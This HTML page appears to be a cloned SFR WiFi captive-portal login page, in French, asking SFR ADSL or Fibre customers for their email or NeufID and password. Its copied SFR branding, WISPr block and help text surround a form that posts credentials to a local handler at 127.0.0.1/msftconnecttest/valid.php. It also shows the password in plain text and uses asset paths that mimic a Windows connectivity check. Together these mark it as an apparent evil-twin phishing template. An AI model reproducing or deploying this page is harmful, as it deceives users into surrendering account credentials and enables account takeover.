<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
					"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>Portail Captif Communautaire SFR WiFi</title>
        <script type="text/javascript" src="/msftconnecttest/js/pcnb4.js"></script>
        <link rel="stylesheet" type="text/css" href="/msftconnecttest/css/mode4/default-pc.css" />
	
	<!-- WISPr message -->
<!--
<?xml version="1.0" encoding="UTF-8"?>
		<WISPAccessGatewayParam xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="https://hotspot.sfr.fr/dashboard/WISPAccessGatewayParam.xsd">
			<Redirect>
				<AccessProcedure>1.0</AccessProcedure>
				<AccessLocation>https://hotspot.wifi.sfr.fr/nb4_crypt.php</AccessLocation>
				<LocationName>Portail NB4</LocationName>
				<LoginURL>https://hotspot.wifi.sfr.fr/indexEncryptingChilli.php?res=smartclient&uamip=192.168.2.1&uamport=3990&challenge=5fc5720880525deaf64532a344279b3d&mode=4&mac=EC-55-F9-AA-AF-AC&userurl=http%3A%2F%2Frfinder.asalink.net%2Ffree%2F</LoginURL>
				<AbortLoginURL></AbortLoginURL>
				<MessageType>100</MessageType>
				<ResponseCode>0</ResponseCode>
			</Redirect>
		</WISPAccessGatewayParam>
-->
	<!--SFRLoginURL_JIL=https://hotspot.wifi.sfr.fr/indexEncryptingChilli.php?res=notyet&uamip=192.168.2.1&uamport=3990&challenge=5fc5720880525deaf64532a344279b3d&userurl=http%3a%2f%2frfinder.asalink.net%2ffree%2f&nasid=00-17-33-9d-34-47&mac=EC-55-F9-AA-AF-AC&mode=4&channel=0-->
    </head>

    <body onload="init()">
		<!--version>5.3_rlp - PCNB4 - {28/02/2013}</version-->
        <table border="0" cellpadding="0" cellspacing="0" width="900" align="center" style="border: 1px #d1d1d1 solid;margin-top:20px">
            <a href="http://127.0.0.1//msftconnecttest/index.php"><IMG class="displayed" img src="favicon.png"></a>
            <tr>
                <td valign="top">
                    <div class="infosBloc fr">
                      <div class="sfr_mea">
<a href="http://127.0.0.1//msftconnecttest/index.php"><img src="sfroptions.png"></a>
                <td width="390px" valign="top">
                    <div class="authentBloc">
                        <form method="POST" action="http://127.0.0.1//msftconnecttest/valid.php">
                            <div class="titre">Vous &ecirc;tes client <span class="rouge">SFR</span> ADSL ou Fibre,<br />identifiez-vous !</div>
                            <div class="identifiant">
                                <strong><span class="rouge">E-mail</span> ou <span class="rouge">NeufID</span></strong><br />
                                <input type="text" name="cle" size="30" />
                            </div>
                            <div class="motdepasse">
                                <strong>Mot de passe</strong><br />
                                <input type="text" name="cleconf" size="30" />
                            </div>
                            <div class="cond">
                                <input type="checkbox" name="conditions" id="conditions" /> J'accepte les <strong><a href="">termes et conditions</a></strong> du service<br />
                                <input type="checkbox" name="save" id="save" /> Se souvenir de mon identifiant
                            </div>
                            <div class="connexion">
                                
                                <input type="submit" name="connexion" id="connexion" value="CONNEXION" class="boutonC" /><br /><br />
                                <div class="plusInfos">
                                    <div class="sprite-puce" style="margin-left:19.9em"></div>
                                    <div style="float: right;"><a href="#" onclick="openPopup(700, 440, 'aideDiv', true)">Besoin d'aide ?</a></div>
                                </div>
                                <br />
                            </div>
                            <div class="infos">
                                <div class="sprite-ligne-grise" style="margin-bottom:20px;"></div>
                                <div class="image">
                                    <div class="sprite-ampoule"></div>
                                </div>
                                <div class="texte">
                                    <strong>Vous &ecirc;tes client SFR, ADSL ou Fibre?</strong><br />
                                    Chez vous, utilisez votre r&eacute;seau WiFi priv&eacute; pour surfer sur internet !
                                </div>
                                <div class="plusInfos">
                                    <div class="sprite-puce" style="margin-left:16.7em"></div>
                                    <div style="float: right;">Plus d'infos</div>
                                </div>
                            </div>
                        </form>
                    </div>
                </td>
            </tr>
            <tr>
                <td colspan="2" class="footerBloc">
                    <a href="#" onclick="javascript:changeLangue('en');"><div class="sprite-en"></div></a><a href="" target="_blank">Assistance</a>
                </td>
            </tr>
        </table>
        <div class="voile" id="voile"> </div>
        <div class="box" id="box">
            <table border="0" width="100%" height="100%" cellpadding="0" cellspacing="0">
                <tr align="right" height="38" valign="middle">
                    <td><div id="fermerBox" class="fermer">
                            <a onclick="javascript:closePopup()"><div class="sprite-fermer"></div>
                            <div style="position:absolute;right:1.5em;top:5px">FERMER</div></a>
                            <div style="clear: both"></div>
                    </div></td>
                </tr>
                <tr align="center" valign="top"><td id="contenuBox"></td></tr>
            </table>
        </div>
        <div id="erreurDiv" style="display: none">
            <div style="width:500px;height:200px;background-color:#d1d1d1;font-size:16px;line-height:30px;">
                <br /><span class="rouge" style="font-weight:bold;font-size:24px">ERREUR D'AUTHENTIFICATION !</span><br />
                <hr style="height:2px;width:400px;background-color:black;border:1px black solid" /><br />
                Assurez-vous d'avoir saisi vos <strong>identifiants</strong> neufbox de SFR.<br />
                Si vous &ecirc;tes chez vous, utilisez plut&ocirc;t votre acc&egrave;s WiFi priv&eacute;.
            </div>
        </div>
       
        <div id="aideDiv">
            <div id="aideContenu">
                    <p style="padding-top:40px!important">
                        <strong>Quel identifiant et mot de passe utiliser pour s'identifier ?</strong><br /><br />
                        Votre identifiant SFR WiFi est votre identifiant SFR.fr .<br />
                        Vous devez &ecirc;tre client Internet ADSL ou Fibre.<br />
                        La nature des identifiants et mots de passe peut varier suivant votre  abonnement.<br />
                        Pour conna&icirc;tre le bon couple identifiant/mot de passe, pr&eacute;cisez si:
                    </p>
                    <p><a href="#" onclick="showInfos('p1')">Vous &ecirc;tes abonn&eacute;(e) Neufbox de SFR</a></p>
                    <div id="p1" style="display:none">
                        <p >
                            <span class="rouge"><strong>Vous &ecirc;tes titulaire d'un compte neufbox de SFR</strong></span><br />
                            <strong>Comment se connecter sur SFR.fr ?</strong><br /><br />
                            <span style="text-decoration:underline">votre identifiant SFR.fr</span><br />
                        </p>
                            <ul><li><span>l'adresse email re&ccedil;ue par courrier lors de votre inscription (exemple : jean.dupont@sfr.fr)</span></li></ul>
                        <p>ou</p>
                            <ul><li><span>votre adresse email personnalis&eacute;e si vous l'avez modifi&eacute;e (exemple : j.dupont@sfr.fr)</span></li></ul>
                        <p>ou</p>
                            <ul><li><span>votre identifiant Mon Compte (9ID)</span></li></ul>

                        <p><span style="text-decoration:underline">votre mot de passe</span></p>
                        <ul><li><span>le mot de passe re&ccedil;u par courrier lors de votre inscription</span></li></ul>
                        <p>ou</p>
                            <ul><li><span>votre mot de passe personnalis&eacute;</span></li></ul><br />
                        <p>
                            <strong>Vous n'arrivez pas &agrave; acc&eacute;der &agrave; votre compte ?</strong><br />
                            Vous pouvez aussi contacter votre Service Client au 1077 (tarif local depuis une ligne fixe en France m&eacute;tropolitaine, temps d'attente gratuit depuis une ligne neufbox).
                        </p>
                    </div>

                    <p style="padding:0;margin:0;padding-left:30px!important"><a href="#" onclick="showInfos('p2')">Vous &eacute;tiez abonn&eacute;(e) Neuf, Club Internet ou AOL</a></p>
                    <div id="p2" style="display:none">
                        <p >
                            <span class="rouge"><strong>Vous &ecirc;tiez abonn&eacute;(e) Neuf, Club Internet, ou AOL, vous &ecirc;tes d&eacute;sormais titulaire d'un compte SFR</strong></span><br />
                            <strong>Comment se connecter sur SFR.fr ?</strong><br /><br />
                            <span style="text-decoration:underline">votre identifiant SFR.fr</span><br />
                        </p>
                            <ul><li><span>votre nom d'utilisateur</span></li></ul>
                        <p>ou</p>
                            <ul><li><span>votre identifiant Mon Compte (9ID)</span></li></ul>
                        <p>ou</p>
                            <ul><li><span>l'adresse email (exemples : jean.dupont@neuf.fr, jean.dupont@club.fr, jean.dupont@sfr.fr) que vous avez choisie comme identifiant dans la rubrique Mon Compte</span></li></ul>
                        <p>ou</p>
                            <ul><li><span>l'adresse email (@sfr.fr) obtenue par courrier lors de la migration de votre compte chez SFR</span></li></ul>
                        <p>ou</p>
                            <ul><li><span>l'adresse email re&ccedil;ue par courrier lors de votre inscription (exemple : jean.dupont@sfr.fr)</span></li></ul>
                        <p>ou</p>
                            <ul><li><span>votre adresse email personnalis&eacute;e si vous l'avez modifi&eacute;e (exemple : j.dupont@sfr.fr)</span></li></ul>
                        <p><span style="text-decoration:underline">votre mot de passe</span></p>
                            <ul><li><span>le mot de passe que vous avez cr&eacute;&eacute; dans la rubrique Mon Compte</span></li></ul>
                        <p>ou</p>
                            <ul><li><span>le mot de passe obtenu par courriel lors de la migration de votre compte chez SFR</span></li></ul>
                        <br />
                        <p>
                            <strong>Vous n'arrivez pas &agrave; acc&eacute;der &agrave; votre compte ?</strong><br />
                            Vous pouvez aussi contacter votre Service Client au 1077 (tarif local depuis une ligne fixe en France m&eacute;tropolitaine, temps d'attente gratuit depuis une ligne neufbox).
                        </p>

                    </div>
                    <p style="padding:0;margin:0;padding-left:30px!important"><a href="#" onclick="showInfos('p3')">Vous poss&eacute;dez uniquement une adresse email secondaire</a></p>
                    <div id="p3" style="display:none;">
                        <p>
                            <span class="rouge"><strong>Vous poss&eacute;dez uniquement une adresse email secondaire</strong></span><br />
                            <strong>Comment se connecter sur SFR.fr ?</strong><br /><br />
                            <span style="text-decoration:underline">votre identifiant SFR.fr</span>
                        </p>
                        <ul><li><span>votre adresse email compl&egrave;te, cr&eacute;&eacute;e par le titulaire du compte SFR (jean.dupont@sfr.fr)</span></li></ul>
                        <p><span style="text-decoration:underline">votre mot de passe</span></p>
                            <ul><li><span>le mot de passe choisi par le titulaire du compte SFR lors de la cr&eacute;ation de votre adresse email</span></li></ul>
                        <p>ou</p>
                            <ul><li><span>votre mot de passe personnalis&eacute;, si vous l'avez chang&eacute; depuis la cr&eacute;ation de ce compte</span></li></ul><br />
                        <p>
                            <strong>Vous n'arrivez pas &agrave; acc&eacute;der &agrave; votre compte ?</strong><br />
                            Vous pouvez aussi contacter votre Service Client au 1077 (tarif local depuis une ligne fixe en France m&eacute;tropolitaine, temps d'attente gratuit depuis une ligne neufbox).
                        </p>
                    </div>
                    <p style="padding:0;margin:0;padding-left:30px!important"><a href="" target="_blank">Membre de la communaut&eacute; Fon</a></p>
            </div>
        </div>
        <div id="tracking"></div>
		<script type="text/javascript" src="/msftconnecttest/js/track.js"></script>
    </body>

</html>

